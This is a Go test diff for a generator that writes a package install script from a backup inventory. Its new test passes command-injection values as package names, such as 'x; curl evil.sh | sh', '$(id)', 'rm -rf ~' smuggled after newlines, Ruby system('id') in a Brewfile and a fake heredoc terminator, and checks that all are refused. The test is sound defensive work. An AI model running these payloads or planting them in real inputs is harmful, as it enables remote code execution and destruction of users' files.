@@ -193,19 +193,19 @@ func TestBuildPackageInstallScript(t *testing.T) {
 	for _, want := range []string{
 		"#!/bin/bash", "set -uo pipefail",
 		"command -v brew", "brew bundle --file=-", "BREWFILE",
-		"command -v fnm", "fnm install v20.0.0 || true",
-		"command -v bun", "bun add -g argent || true",
-		"command -v cargo", "cargo install ripgrep || true",
-		"command -v pipx", "pipx install poetry || true",
-		"command -v rustup", "rustup toolchain install stable || true",
-		"command -v cursor", "cursor --install-extension anthropic.claude-code || true",
-		"command -v uv", "uv tool install ruff || true",
-		"command -v composer", "composer global require laravel/installer || true",
-		"command -v dart", "dart pub global activate melos || true",
-		"command -v dotnet", "dotnet tool install --global dotnetsay || true",
-		"command -v apt-get", "sudo apt-get install -y ripgrep || true",
-		"command -v snap", "sudo snap install code || true",
-		"command -v flatpak", "flatpak install -y flathub org.gimp.GIMP || true",
+		"command -v fnm", "fnm install 'v20.0.0' || true",
+		"command -v bun", "bun add -g 'argent' || true",
+		"command -v cargo", "cargo install 'ripgrep' || true",
+		"command -v pipx", "pipx install 'poetry' || true",
+		"command -v rustup", "rustup toolchain install 'stable' || true",
+		"command -v cursor", "cursor --install-extension 'anthropic.claude-code' || true",
+		"command -v uv", "uv tool install 'ruff' || true",
+		"command -v composer", "composer global require 'laravel/installer' || true",
+		"command -v dart", "dart pub global activate 'melos' || true",
+		"command -v dotnet", "dotnet tool install --global 'dotnetsay' || true",
+		"command -v apt-get", "sudo apt-get install -y 'ripgrep' || true",
+		"command -v snap", "sudo snap install 'code' || true",
+		"command -v flatpak", "flatpak install -y flathub 'org.gimp.GIMP' || true",
 		"# deno global bins", "#   deployctl",
 		"exit 0",
 	} {
@@ -252,5 +252,45 @@ func TestPlanFilesEncryptsPerFile(t *testing.T) {
 	high := PlanFiles(PlanItem{Kind: "dir", Encrypt: true}, []string{"/a"}, func(string) bool { return false })
 	if !high[0].Encrypt {
 		t.Error("a high-sensitivity dir encrypts every file")
+	}
+}
+
+// Names come from a backup's inventory, which a readable GitHub copy lets
+// anyone with write access edit. Nothing a shell or Ruby reads as code gets
+// into the install script.
+func TestInstallScriptRefusesInjectedNames(t *testing.T) {
+	script, _ := BuildPackageInstallScript(Manifest{
+		NpmGlobals:   []string{"typescript", "@scope/pkg@1.2.3", "x; curl evil.sh | sh", "$(id)", "`id`", "a'b"},
+		CargoCrates:  []string{"ripgrep", "rg && rm -rf ~"},
+		NodeVersions: []string{"v20.11.0", "lts/iron", "v1\nrm -rf ~"},
+		DenoBins:     []string{"deployctl", "x\nrm -rf ~"},
+		Brewfile: strings.Join([]string{
+			`tap "homebrew/cask-fonts"`,
+			`brew "git"`,
+			`brew "postgresql@16", restart_service: :changed`,
+			`brew "nginx-full", args: ["with-rtmp-module"]`,
+			`mas "Final Cut Pro", id: 424389933`,
+			`vscode "ms-python.python"`,
+			`brew "x#{system('id')}"`,
+			`system("id")`,
+			`BREWFILE`,
+			`rm -rf ~`,
+		}, "\n"),
+	})
+	for _, bad := range []string{"curl evil", "$(id)", "`id`", "a'b", "rm -rf", "system(", "#{"} {
+		if strings.Contains(script, bad) {
+			t.Errorf("script contains %q:\n%s", bad, script)
+		}
+	}
+	for _, good := range []string{"'typescript'", "'@scope/pkg@1.2.3'", "'ripgrep'", "'lts/iron'", "#   deployctl",
+		`brew "postgresql@16", restart_service: :changed`, `brew "nginx-full", args: ["with-rtmp-module"]`,
+		`mas "Final Cut Pro", id: 424389933`, `vscode "ms-python.python"`, `tap "homebrew/cask-fonts"`} {
+		if !strings.Contains(script, good) {
+			t.Errorf("script lost %q:\n%s", good, script)
+		}
+	}
+	// The heredoc ends exactly once: a line "BREWFILE" in the data cannot end it early.
+	if strings.Count(script, "\nBREWFILE") != 1 {
+		t.Errorf("heredoc terminator appears more than once:\n%s", script)
 	}
 }
